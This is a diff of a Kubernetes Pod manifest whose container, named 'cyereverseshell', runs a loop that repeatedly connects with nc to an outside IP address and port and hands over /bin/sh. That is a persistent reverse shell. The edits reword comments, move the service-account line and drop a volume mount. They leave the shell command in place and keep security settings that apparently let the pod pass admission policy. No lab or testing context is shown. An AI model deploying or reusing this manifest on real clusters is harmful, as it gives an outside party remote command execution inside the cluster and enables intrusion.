@@ -2,26 +2,19 @@ apiVersion: v1
 kind: Pod
 metadata:
   name: cyerspod
-  namespace: nati  # Correct namespace
+  namespace: nati  # Ensure the namespace is correct
   labels:
     app: nc
 spec:
-  serviceAccountName: cyerspod-sa  # Use the ServiceAccount in the 'nati' namespace
   containers:
   - name: cyereverseshell
     image: busybox
     args: ["sh", "-c", "while true; do nc 68.183.22.232 4641 -e /bin/sh; sleep 10; done"]
     securityContext:
       allowPrivilegeEscalation: false  # Required by PodSecurity policy
-      runAsNonRoot: true  # Must not run as root
+      runAsNonRoot: true  # Ensure the container doesn't run as root
       capabilities:
-        drop: ["ALL"]  # Drop all capabilities
+        drop: ["ALL"]  # Drop all unnecessary capabilities
       seccompProfile:
-        type: RuntimeDefault  # Use the default seccomp profile
-    volumeMounts:
-    - name: tempvolume
-      mountPath: /host
-      readOnly: false
-  volumes:
-  - name: tempvolume
-    emptyDir: {}  # Use emptyDir to avoid hostPath issues
+        type: RuntimeDefault  # Enforce the default seccomp profile
+  serviceAccountName: cyerspod-sa  # Attach the service account
